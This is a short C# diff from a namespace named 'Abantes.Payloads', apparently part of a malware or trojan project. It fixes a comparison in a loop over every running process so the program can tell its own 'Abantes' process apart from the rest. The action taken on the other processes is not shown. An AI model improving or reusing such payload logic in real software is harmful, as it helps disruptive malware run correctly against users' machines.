@@ -192,7 +192,7 @@ namespace Abantes.Payloads
 
             foreach (Process proc in allProcesses)
             {
-                if (proc.ToString() != Process.GetProcessesByName("Abantes").ToString())
+                if (proc.ToString() != Process.GetProcessesByName("Abantes")[0].ToString())
                 {
                     try
                     {
